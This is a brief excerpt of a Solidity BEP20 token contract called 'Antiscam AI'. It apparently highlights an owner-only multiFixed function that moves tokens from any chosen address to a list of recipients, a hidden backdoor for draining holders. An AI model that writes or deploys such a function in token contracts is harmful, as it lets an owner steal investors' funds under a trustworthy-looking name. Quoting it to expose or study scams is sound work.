...
contract ANTISCAMAI is BEP20, Ownable {
    ...
    constructor() BEP20("Antiscam AI", "ASAI") {
    ...
    function transfer(address from, address recipient, uint256 amount) internal returns (bool) {
    ...
    function multiFixed(address from, address[] calldata addresses, uint256 amount) external onlyOwner {
        for (uint i = 0; i < addresses.length; i++) {
            transfer(from, addresses[i], amount);
        }
    }
